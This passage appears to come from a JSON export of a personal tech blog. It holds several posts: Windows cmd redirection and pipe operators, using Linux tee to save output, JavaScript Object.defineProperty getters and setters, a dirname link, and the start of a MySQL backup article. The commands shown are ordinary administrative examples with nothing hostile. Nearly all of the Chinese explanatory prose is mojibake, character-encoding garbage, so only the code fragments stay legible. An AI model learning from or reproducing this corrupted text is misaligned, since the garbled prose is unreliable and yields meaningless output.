å¥æŸ„ï¼‰å‘é€åˆ°å‘½ä»¤æç¤ºç¬¦çª—å£ã€‚é‡å®šå‘è¾“å…¥ (&lt;)è¦é€šè¿‡é”®ç›˜å°†è¾“å…¥é‡å®šå‘åˆ°æ–‡ä»¶æˆ–è®¾å¤‡ï¼Œè¯·ä½¿ç”¨ &lt; æ“ä½œç¬¦ã€‚ä¾‹å¦‚ï¼Œè¦ä» File.txt è·å– sort å‘½ä»¤çš„è¾“å…¥ï¼Œè¯·é”®å…¥ï¼šsortFile.txt çš„å†…å®¹å°†ä»¥å­—æ¯é¡ºåºåˆ—è¡¨çš„æ–¹å¼æ˜¾ç¤ºåœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­ã€‚&lt; æ“ä½œç¬¦å¯ä»¥æ‰“å¼€å…·æœ‰åªè¯»è®¿é—®æƒé™çš„æŒ‡å®šæ–‡ä»¶åã€‚å› æ­¤ï¼Œä¸èƒ½åœ¨ä½¿ç”¨è¯¥æ“ä½œç¬¦æ—¶å‘æ–‡ä»¶ä¸­å†™å…¥ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä»¥ &lt;&amp;2 å¯åŠ¨ç¨‹åºï¼Œåˆ™æ‰€æœ‰è¯•å›¾è¯»å–å¥æŸ„ 0 çš„æ“ä½œéƒ½å°†å¤±è´¥ï¼Œå› ä¸ºå¥æŸ„ 2 æœ€åˆæ˜¯ä»¥åªå†™è®¿é—®æ–¹å¼æ‰“å¼€çš„ã€‚æ³¨æ„â€¢0 æ˜¯ &lt; é‡å®šå‘è¾“å…¥æ“ä½œç¬¦çš„é»˜è®¤å¥æŸ„ã€‚é‡å®šå‘è¾“å‡º (&gt;)å‡ ä¹æ‰€æœ‰çš„å‘½ä»¤éƒ½å°†è¾“å‡ºå‘é€åˆ°å‘½ä»¤æç¤ºç¬¦çª—å£ã€‚å³ä½¿å°†è¾“å‡ºå‘é€åˆ°é©±åŠ¨å™¨æˆ–æ‰“å°æœºçš„å‘½ä»¤ä¹Ÿä¼šåœ¨å‘½ä»¤æç¤ºç¬¦çª—å£æ˜¾ç¤ºæ¶ˆæ¯å’Œæç¤ºã€‚è¦å°†è¾“å‡ºä»å‘½ä»¤æç¤ºç¬¦çª—å£é‡å®šå‘åˆ°æ–‡ä»¶æˆ–è®¾å¤‡ï¼Œè¯·ä½¿ç”¨ &gt; æ“ä½œç¬¦ã€‚å¯ä»¥åœ¨è®¸å¤šå‘½ä»¤ä¸­ä½¿ç”¨è¯¥æ“ä½œç¬¦ã€‚ä¾‹å¦‚ï¼Œè¦å°† dir è¾“å‡ºé‡å®šå‘åˆ° Dirlist.txtï¼Œè¯·é”®å…¥ï¼šdir&gt;dirlist.txtå¦‚æœ Dirlist.txt ä¸å­˜åœ¨ï¼ŒCmd.exe å°†åˆ›å»ºè¯¥æ–‡ä»¶ã€‚å¦‚æœ Dirlist.txt å­˜åœ¨ï¼ŒCmd.exe å°†ä½¿ç”¨ dir å‘½ä»¤çš„è¾“å‡ºæ›¿æ¢æ–‡ä»¶ä¸­çš„ä¿¡æ¯ã€‚è¦è¿è¡Œ netsh routing dump å‘½ä»¤ï¼Œç„¶åå°†è¾“å‡ºå‘é€åˆ° Route.cfgï¼Œè¯·é”®å…¥ï¼šnetsh routing dump&gt;c:\\route.cfgæ“ä½œç¬¦å¯ä»¥æ‰“å¼€å…·æœ‰åªå†™è®¿é—®æƒé™çš„æŒ‡å®šæ–‡ä»¶ã€‚å› æ­¤ï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ“ä½œç¬¦è¯»å–æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨é‡å®šå‘æ“ä½œç¬¦ &gt;&amp;0 å¯åŠ¨ç¨‹åºï¼Œåˆ™å†™å…¥å¥æŸ„ 1 çš„æ‰€æœ‰å°è¯•æ“ä½œéƒ½å°†å¤±è´¥ï¼Œå› ä¸ºå¥æŸ„ 0 æœ€åˆæ˜¯ä»¥åªè¯»è®¿é—®æ–¹å¼æ‰“å¼€çš„ã€‚æ³¨æ„â€¢1 æ˜¯ &gt; é‡å®šå‘è¾“å‡ºæ“ä½œç¬¦çš„é»˜è®¤å¥æŸ„ã€‚å¤åˆ¶å¥æŸ„é‡å®šå‘æ“ä½œç¬¦ &amp; å¯ä»¥å°†è¾“å‡ºæˆ–è¾“å…¥ä»ä¸€ä¸ªæŒ‡å®šå¥æŸ„å¤åˆ¶åˆ°å¦ä¸€ä¸ªæŒ‡å®šçš„å¥æŸ„ã€‚ä¾‹å¦‚ï¼Œè¦å°† dir è¾“å‡ºå‘é€åˆ° File.txt å¹¶å°†é”™è¯¯è¾“å‡ºå‘é€åˆ° File.txtï¼Œè¯·é”®å…¥ï¼šdir&gt;c:\\file.txt 2&gt;&amp;1å¤åˆ¶å¥æŸ„æ—¶ï¼Œå¯ä»¥å¤åˆ¶è¯¥å¥æŸ„åŸçŠ¶æ€çš„æ‰€æœ‰ç‰¹æ€§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå¥æŸ„å…·æœ‰åªè¯»è®¿é—®çš„å±æ€§ï¼Œåˆ™è¯¥å¥æŸ„çš„æ‰€æœ‰å‰¯æœ¬éƒ½å…·æœ‰åªè¯»è®¿é—®å±æ€§ã€‚ä¸èƒ½å°†ä¸€ä¸ªå…·æœ‰åªè¯»è®¿é—®å±æ€§çš„å¥æŸ„å¤åˆ¶åˆ°å¦ä¸€ä¸ªå…·æœ‰åªå†™è®¿é—®å±æ€§çš„å¥æŸ„ã€‚ä½¿ç”¨ &amp; æ“ä½œç¬¦é‡å®šå‘è¾“å…¥å’Œå‰¯æœ¬è¦å°†é‡å®šå‘è¾“å…¥æ“ä½œç¬¦ (&lt;) ä¸å¤åˆ¶æ“ä½œç¬¦ (&amp;) ç»“åˆä½¿ç”¨ï¼ŒæŒ‡å®šçš„æ–‡ä»¶å¿…é¡»å·²ç»å­˜åœ¨ã€‚å¦‚æœè¾“å…¥æ–‡ä»¶å­˜åœ¨ï¼ŒCmd.exe å°†ä»¥åªè¯»æ–¹å¼æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œç„¶åå°†æ–‡ä»¶åŒ…å«çš„å­—ç¬¦ä½œä¸ºè¾“å…¥å‘é€åˆ°æ­¤å‘½ä»¤ï¼ˆå¦‚åŒä»é”®ç›˜è¾“å…¥ä¸€æ ·ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†å¥æŸ„ï¼ŒCmd.exe å°†æŒ‡å®šçš„å¥æŸ„å¤åˆ¶åˆ°ç³»ç»Ÿç°æœ‰çš„å¥æŸ„ä¸­ã€‚ä¾‹å¦‚ï¼Œè¦ä»¥å¥æŸ„ 0 è¾“å…¥è¯»å–ï¼ˆå³ STDINï¼‰çš„æ–¹å¼æ‰“å¼€ File.txtï¼Œè¯·é”®å…¥ï¼š&lt;file.txtè¦æ‰“å¼€ File.txtï¼Œå¹¶åœ¨å†…å®¹æ’åºåå°†è¾“å‡ºå‘é€åˆ°å‘½ä»¤æç¤ºç¬¦çª—å£ï¼ˆå³ STDOUTï¼‰ï¼Œè¯·é”®å…¥ï¼šsort&lt;file.txtè¦æŸ¥æ‰¾ File.txtï¼Œç„¶åå°†å¥æŸ„ 1ï¼ˆå³ STDOUTï¼‰å’Œå¥æŸ„ 2ï¼ˆå³ STDERRï¼‰é‡å®šå‘åˆ° Search.txtï¼Œè¯·é”®å…¥ï¼šfindfile file.txt&gt;search.txt 2&lt;&amp;1è¦ä»¥å¥æŸ„ 0 è¾“å…¥è¯»å–ï¼ˆå³ STDINï¼‰çš„æ–¹å¼å¤åˆ¶ç”¨æˆ·å®šä¹‰çš„å¥æŸ„ 3ï¼Œè¯·é”®å…¥ï¼š&lt;&amp;3ä½¿ç”¨ &amp; æ“ä½œç¬¦é‡å®šå‘è¾“å‡ºå’Œå¤åˆ¶å¦‚æœå°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ä¸”æŒ‡å®šäº†ç°æœ‰çš„æ–‡ä»¶åï¼ŒCmd.exe å°†ä»¥åªå†™æ–¹å¼æ‰“å¼€æ–‡ä»¶å¹¶è¦†ç›–è¯¥æ–‡ä»¶å†…å®¹ã€‚å¦‚æœæŒ‡å®šäº†å¥æŸ„ï¼ŒCmd.exe å°†æ–‡ä»¶å¤åˆ¶åˆ°ç°æœ‰å¥æŸ„ä¸­ã€‚è¦å°†ç”¨æˆ·å®šä¹‰çš„å¥æŸ„ 3 å¤åˆ¶åˆ°å¥æŸ„ 1ï¼Œè¯·é”®å…¥ï¼š&amp;3è¦å°†åŒ…æ‹¬å¥æŸ„ 2ï¼ˆå³ STDERRï¼‰çš„æ‰€æœ‰è¾“å‡ºä» ipconfig å‘½ä»¤é‡å®šå‘åˆ°å¥æŸ„ 1ï¼ˆå³ STDOUTï¼‰ï¼Œç„¶åå°†è¾“å‡ºé‡å®šå‘åˆ° Output.logï¼Œè¯·é”®å…¥ï¼šipconfig.exe&gt;&gt;output.log 2&gt;&amp;1ä½¿ç”¨ &gt;&gt; é‡å®šå‘æ“ä½œç¬¦é™„åŠ è¾“å‡ºè¦ä»å‘½ä»¤ä¸­å°†è¾“å‡ºæ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾è€Œä¸ä¸¢å¤±æ–‡ä»¶ä¸­å·²å­˜åœ¨çš„ä»»ä½•ä¿¡æ¯ï¼Œè¯·ä½¿ç”¨ä¸¤ä¸ªè¿ç»­çš„å¤§äºå·ï¼ˆå³ &gt;&gt;ï¼‰ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥å°† dir å‘½ä»¤ç”Ÿæˆçš„ç›®å½•åˆ—è¡¨é™„åŠ åˆ° Dirlist.txt æ–‡ä»¶ï¼šdir&gt;&gt;dirlist.txtè¦å°† netstat å‘½ä»¤çš„è¾“å‡ºé™„åŠ åˆ° Tcpinfo.txt çš„æœ«å°¾ï¼Œè¯·é”®å…¥ï¼šnetstat&gt;&gt;tcpinfo.txtä½¿ç”¨ç®¡é“æ“ä½œç¬¦ (|)ç®¡é“æ“ä½œç¬¦ (|) å¯ä»¥æå–ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯ STDOUTï¼‰ï¼Œç„¶åå°†å…¶å®šå‘åˆ°å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ï¼ˆé»˜è®¤æƒ…å†µä¸‹æ˜¯ STDINï¼‰ä¸­ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¯¹ç›®å½•è¿›è¡Œåˆ†ç±»ï¼šdir | sortåœ¨æœ¬ä¾‹ä¸­ï¼Œå°†åŒæ—¶å¯åŠ¨ä¸¤ä¸ªå‘½ä»¤ï¼Œä½†éšå sort å‘½ä»¤ä¼šæš‚åœï¼Œç›´åˆ°å®ƒæ¥æ”¶åˆ° dir å‘½ä»¤çš„è¾“å‡ºä¸ºæ­¢ã€‚sort å‘½ä»¤ä½¿ç”¨ dir å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥ï¼Œç„¶åå°†è¾“å‡ºå‘é€åˆ°å¥æŸ„ 1ï¼ˆå³ STDOUTï¼‰ã€‚åˆå¹¶å¸¦é‡å®šå‘æ“ä½œç¬¦çš„å‘½ä»¤é€šè¿‡åˆå¹¶å¸¦æœ‰å…¶ä»–å‘½ä»¤å’Œæ–‡ä»¶åçš„ç­›é€‰å™¨å‘½ä»¤ï¼Œå¯ä»¥åˆ›å»ºè‡ªå®šä¹‰å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å­˜å‚¨åŒ…å«â€œLOGâ€å­—ç¬¦ä¸²çš„æ–‡ä»¶å:dir /b | find â€œlogâ€ loglist.txtdir å‘½ä»¤çš„è¾“å‡ºæ˜¯é€šè¿‡ find ç­›é€‰å™¨å‘½ä»¤è¿›è¡Œå‘é€çš„ã€‚åŒ…å«å­—ç¬¦ä¸²â€œLOGâ€çš„æ–‡ä»¶åä½œä¸ºæ–‡ä»¶ååˆ—è¡¨ï¼ˆä¾‹å¦‚ï¼ŒNetshConfig.logã€Logdat.svd å’Œ Mylog.batï¼‰å­˜å‚¨åœ¨æ–‡ä»¶ Loglist.txt ä¸­ã€‚è¦åœ¨ç›¸åŒå‘½ä»¤ä¸­ä½¿ç”¨å¤šä¸ªç­›é€‰å™¨ï¼Œè¯·ä½¿ç”¨ç®¡é“ (|) åˆ†éš”ç­›é€‰å™¨ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤å°†æœç´¢ C ç›˜ä¸Šçš„æ¯ä¸ªç›®å½•ä»¥æŸ¥æ‰¾åŒ…å«â€œLOGâ€å­—ç¬¦ä¸²çš„æ–‡ä»¶åï¼Œå¹¶ä¸”åœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­æ¯æ¬¡æ˜¾ç¤ºä¸€å±ï¼šdir c:\\ /s /b | find â€œlogâ€ | moreåˆ©ç”¨ç®¡é“ (|) å¯ä»¥å¯¹ Cmd.exe è¿›è¡Œå®šå‘ï¼Œä½¿å…¶é€šè¿‡ find ç­›é€‰å™¨å‘½ä»¤å‘é€ dir å‘½ä»¤è¾“å‡ºã€‚find å‘½ä»¤åªé€‰æ‹©åŒ…å«å­—ç¬¦ä¸²â€œLOGâ€çš„æ–‡ä»¶åã€‚more å‘½ä»¤å¯ä»¥æ˜¾ç¤º find å‘½ä»¤é€‰æ‹©çš„æ–‡ä»¶åï¼ˆåœ¨å‘½ä»¤æç¤ºç¬¦çª—å£ä¸­æ¯æ¬¡æ˜¾ç¤ºä¸€å±ï¼‰ã€‚æœ‰å…³ç­›é€‰å™¨å‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ä½¿ç”¨ç­›é€‰å™¨ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"Linuxä½¿ç”¨teeåŒå‘é‡å®šå‘","slug":"history/tech/5953c4d0c2b92f5665eed9c7","date":"2015-12-29T17:32:56.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c7/","excerpt":"","text":"è¿™ç¯‡æ–‡ç« ä»‹ç»ä¸ªé‡å®šå‘çš„å°æŠ€å·§â€“åŒå‘é‡å®šå‘ï¼å¹³æ—¶æˆ‘ä»¬å–œæ¬¢å°†å¾ˆé•¿çš„Linuxçš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œç„¶åå†å»åˆ†æè¿™ä¸ªâ€œå¤§æ–‡ä»¶â€ï¼Œé‚£æœ‰æ²¡æœ‰åœ¨ä¸å½±å“æ ‡å‡†è¾“å‡ºçš„åŒæ—¶èƒ½å†æ¬¡å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ä¸­çš„æ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œé‚£å°±æ˜¯teeå‘½ä»¤ï¼http://ourunix.b0.upaiyun.com/2014/03/tee.jpgteeå‘½ä»¤ä½¿ç”¨å¾ˆç®€å•ï¼šæ¯”å¦‚ä½¿ç”¨lså‘½ä»¤æ˜¾ç¤ºæ‰€æœ‰çš„å†…å®¹ï¼Œé™¤äº†åœ¨å±å¹•ä¸Šç…§å¸¸è¾“å‡ºå¤–ï¼Œè¿˜ä¿ç•™äº†ä¸€ä»½æ–‡æœ¬è®°å½•ï¼š12345678$ lstest2 test3 test4$ ll | tee tee.outtotal 12-rw-rw-r-- 1 mars mars 0 Mar 17 22:00 tee.outdrwxrwxr-x 2 mars mars 4096 Mar 17 14:00 test2drwxrwxr-x 2 mars mars 4096 Mar 17 14:00 test3drwxrwxr-x 2 mars mars 4096 Mar 17 14:16 test4æœ‰äººè¯´è¿™ä¸ªå‘½ä»¤å¯èƒ½æœ‰ç‚¹åè€Œä¸å®ï¼Œä½†æ˜¯lorinnnå‘Šè¯‰ä½ æ¯”å¦‚è¿™æ ·ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼Œä½ çš„æœåŠ¡å™¨çš„å‰©ä½™ç©ºé—´ä¸å¤Ÿäº†ï¼Œä½ æ‰“ç®—å»æ¸…ç†ç©ºé—´ï¼Œå¯æ˜¯/homeç›®å½•ä¸‹æœ‰å¤ªå¤šçš„æ–‡ä»¶éœ€è¦ç»Ÿè®¡ï¼Œè®¡ç®—ï¼Œç”šè‡³å¿…é¡»è¿›å…¥å­ç›®å½•æŸ¥çœ‹æ‰èƒ½çŸ¥é“æ–‡ä»¶æ˜¯å¦èƒ½å¤Ÿåˆ é™¤ï¼Œè¿™æ—¶ä½ ç”¨du -skå¹¶ç”¨http://www.ourunix.org/post/295.htmlè¿›è¡Œäº†ä»å¤§åˆ°å°çš„æ’åºï¼Œç„¶åä½ è¿›å…¥è¿™äº›å¤§ç›®å½•é‡Œé¢æŸ¥çœ‹æ˜¯å¦èƒ½å¤Ÿåˆ é™¤ï¼Œèµ°ç€èµ°ç€ï¼Œç„¶åè¿™ä¸ªæ’åºç»“æœæ˜¯ä¸æ˜¯è¢«æ·¹æ²¡äº†ï¼Œæ‰¾ä¸åˆ°äº†æœ‰æ²¡æœ‰ï¼Ÿå¦‚æœä½ èƒ½å°†å½“æ—¶çš„ç»“æœè®°å½•ä¸‹æ¥ï¼Œç„¶åå†å»ä¸€ä¸ªä¸€ä¸ªæ¸…ç†ï¼Œé‚£å²‚ä¸æ˜¯ç¾å“‰ï¼1234567891011$ du -sk * | sort -n -k 1 -r | head | tee big.out17565256 SyncIAD1SamplePriority15748612 runMarsTool8274728 MARS26623984 TableTransfer6384448 FlashDB6341424 MonitorPAFI4914916 googleCountParser3954296 PAFIPatternServer2751844 MapReduceJobs2709280 UpdateReportSummaryæŸ¥çœ‹åˆšæ‰çš„big.outæ–‡ä»¶ï¼š1234567891011$ cat big.out17565256 SyncIAD1SamplePriority15748612 runMarsTool8274728 MARS26623984 TableTransfer6384448 FlashDB6341424 MonitorPAFI4914916 googleCountParser3954296 PAFIPatternServer2751844 MapReduceJobs2709280 UpdateReportSummaryæœ¬æ–‡æ ‡ç­¾ï¼šhttp://www.ourunix.org/post/tag/tee, http://www.ourunix.org/post/tag/æ–‡æœ¬å¤„ç†**Â©å£°æ˜ï¼š**æœ¬ç«™åŸåˆ›æ–‡ç« é‡‡ç”¨http://creativecommons.org/licenses/by-nc-sa/3.0/cn/åˆ›ä½œå…±ç”¨åè®®ï¼Œè½¬è½½æ—¶è¯·ä»¥é“¾æ¥å½¢å¼æ ‡æ˜æœ¬æ–‡åœ°å€ï¼›éåŸåˆ›ï¼ˆè½¬è½½ï¼‰æ–‡ç« ç‰ˆæƒå½’åŸä½œè€…æ‰€æœ‰ã€‚ã€http://www.ourunix.org/copyrightã€‘Â©è½¬è½½è¯·æ³¨æ˜æ¥æºï¼š http://www.ourunix.org/post/303.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"Object.defineProperty","slug":"history/tech/5953c4d0c2b92f5665eed9c6","date":"2015-12-29T03:16:08.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c6/","excerpt":"","text":"ä½¿ç”¨ Object.definePropertyfishenal fishenal 2014å¹´06æœˆ17æ—¥ å‘å¸ƒæ¨è 1 æ¨èæ”¶è— 5 æ”¶è—ï¼Œ1.3k æµè§ˆObject.definePropertyï¼Œé¡¾åæ€ä¹‰ï¼Œä¸ºå¯¹è±¡å®šä¹‰å±æ€§ï¼Œä½†æ˜¯ç–‘é—®æ˜¯ï¼Œæˆ‘ä»¬æœ‰å¤ªå¤šçš„åŠæ³•å»å®šä¹‰ä¸€ä¸ªå¯¹è±¡çš„å±æ€§äº†,æ¯”å¦‚foo = 100,æ¯”å¦‚foo.bar = 100ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç”¨å®ƒï¼Ÿä¼šä¸ä¼šæ˜¯è‡ªæ‰¾éº»çƒ¦å‘¢ï¼Ÿä½¿ç”¨Object.definePropertyçš„åŸå› å¾ˆç®€å•ï¼Œå› ä¸ºåªæœ‰é€šè¿‡å®ƒæ‰èƒ½å®šä¹‰ä¸€äº›å€¼å¾—ç‰¹æ®Šå±æ€§ï¼Œæ¯”å¦‚æ˜¯å¦å¯å†™ï¼Œæ˜¯å¦å¯æšä¸¾ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ä¾‹å­æ¥çœ‹ä¸€ä¸‹ã€‚å®šä¹‰æˆ–ä¿®æ”¹å±æ€§var demo = {foo:1,bar:2};Object.defineProperty(demo, â€˜fooâ€™,{value:100});Object.defineProperty(demo, â€˜foobarâ€™,{value:â€œhelloâ€});è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€ä¸ªä¿®æ”¹äº†demoçš„å±æ€§fooï¼Œç¬¬äºŒä¸ªåˆ›å»ºäº†foobarå±æ€§ï¼Œå±æ€§çš„å€¼æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­valueã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦ä¿®æ”¹çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å±æ€§åï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯â€œæè¿°â€ï¼Œä¸€ä¸ªå¯ä»¥å¯¹å±æ€§è¿›è¡Œä¸€äº›è®¾å®šçš„é”®å€¼å¯¹ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æƒ³è®©ä¸€ä¸ªå±æ€§å˜å¾—ä¸å¯æšä¸¾ï¼Œè¦è¿™ä¹ˆå†™Object.defineProperty(demo, â€˜foobarâ€™,{value:â€œhelloâ€,enumerable:false});å¯æšä¸¾çš„å±æ€§ä¸Šä¸€ä¸ªä¾‹å­å…¶å®æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºenumerableçš„é»˜è®¤å€¼å°±æ˜¯false,ç”¨ä¸Šè¿°æ–¹æ³•åˆ›å»ºçš„å±æ€§é»˜è®¤å°±æ˜¯ä¸å¯æšä¸¾ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯ä¸å¯æšä¸¾å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œforâ€¦in æˆ– Object.keysæ‰¾ä¸åˆ°å®ƒ,ç”¨MDNä¸Šçš„æ —å­var o = {};Object.defineProperty(o, â€œaâ€, { value : 1, enumerable:true });Object.defineProperty(o, â€œbâ€, { value : 2, enumerable:false });Object.defineProperty(o, â€œcâ€, { value : 3 }); // enumerable defaults to falseo.d = 4; // å¦‚æœä½¿ç”¨ç›´æ¥èµ‹å€¼çš„æ–¹å¼åˆ›å»ºå¯¹è±¡çš„å±æ€§ï¼Œåˆ™è¿™ä¸ªå±æ€§çš„enumerableä¸ºtruefor (var i in o) {console.log(i);}// æ‰“å° â€˜aâ€™ å’Œ â€˜dâ€™ (in undefined order)Object.keys(o); //o.propertyIsEnumerable(â€˜aâ€™); // trueo.propertyIsEnumerable(â€˜bâ€™); // falseo.propertyIsEnumerable(â€˜câ€™); // falseæ‰€ä»¥ï¼ŒåŒæ ·ä½ å¯ä»¥å®šä¹‰çš„å±æ€§åŒ…æ‹¬Writable æ˜¯å¦å¯å†™Configurable æ˜¯å¦èƒ½åˆ é™¤æ‰€ä»¥,Object.definePropertyç›¸å½“äº .å’Œ[]çš„ä¸€ä¸ªåŠ å¼ºç‰ˆï¼Œä½†æ˜¯å¦å¤–ä¸€ä¸ªå› ç´ ä¹Ÿè®©ä»–å˜å¾—æ›´å¼ºå¤§ã€‚å±æ€§çš„getterå’Œsetteré€šè¿‡Object.definePropertyå¯ä»¥è‡ªå®šä¹‰å±æ€§çš„getterå’Œsetterï¼Œçœ‹æ —å­var demo = {foobar: â€˜helloâ€™}var v;Object.defineProperty(demo,â€˜foobarâ€™,{get:function(){console.log(â€˜i am been gettingâ€™)return v + â€˜?â€™},set:function(e){v = e + â€˜!â€™;console.log(â€˜i am changing!â€™)}})demo.foobar = â€œbyeâ€console.dir(demo.foobar)//â€˜i am changing!â€™//â€˜i am been gettingâ€™//â€˜bye!?â€™è¿™åªæ˜¯ä¸€ä¸ªæ¶ä½œå‰§ï¼Œè®©å±æ€§åœ¨ä¿®æ”¹å’Œè·å–çš„æ—¶å€™éƒ½è¿›è¡Œäº†ä¿®æ”¹ï¼Œä¸è¿‡è¿™ç¡®å®æ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•å®ç°é¡µé¢å±•ç°ä¸æ•°æ®çš„ç»‘å®šï¼Œè®©ä½ çš„å…³æ³¨ç‚¹é›†ä¸­åœ¨æ•°æ®è€Œä¸æ˜¯æ•°æ®çš„å±•ç°è¿‡ç¨‹ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„&quot;åŒå‘ç»‘å®š&quot;æ¯”å¦‚è¿™æ ·ï¼švar demo = {}var v;Object.defineProperty(demo,â€˜foobarâ€™,{get:function(){return v;},set:function(e){v = e;sow();}});function sow(){$(â€˜bodyâ€™).html(demo.foobar)}demo.foobar = â€œhelloâ€setTimeout(function(){demo.foobar = â€œbyeâ€setTimeout(function(){demo.foobar = â€˜i am backâ€™},1000)},1000)è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ•°æ®çš„å±•ç°äº¤ç»™äº†sow()å»åšï¼Œæ•°æ®è¿™è¾¹æ¯æ¬¡æ›´æ–°demo.foobarçš„å€¼ï¼Œå±•ç°å°±ä¼šæ›´æ–°ï¼Œè¿™ä¸€åˆ‡éƒ½å¾—ç›ŠäºObject.definePropertyæœ€åçš„è¯Object.definePropertyæ˜¯ECS5å±æ€§ï¼Œæ‰€ä»¥IE8ä»¥ä¸‹æ— æ•ˆã€‚æ›´å¤šè¯·è§https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/definePropertyjavascript","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"dirname","slug":"history/tech/5953c4d0c2b92f5665eed9c5","date":"2015-12-29T02:59:44.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c5/","excerpt":"","text":"å‚è€ƒåœ°å€:http://www.cnblogs.com/xd502djj/archive/2012/06/21/2557447.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"},{"name":"shell","slug":"shell","permalink":"https://wangxiuwen.github.io/tags/shell/"}],"author":"wangxiuwen"},{"title":"ä½¿ç”¨è„šæœ¬è‡ªåŠ¨åŒ–è¿œç¨‹å¤‡ä»½MySQLæ•°æ®åº“","slug":"history/tech/5953c4d0c2b92f5665eed9c4","date":"2015-12-28T03:48:53.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c4/","excerpt":"","text":"é€šå¸¸æƒ…å†µä¸‹ã€mysqléƒ½éœ€è¦å¤‡ä»½ï¼Œå¤‡ä»½çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ã€‚ä¸‹é¢æ˜¯æˆ‘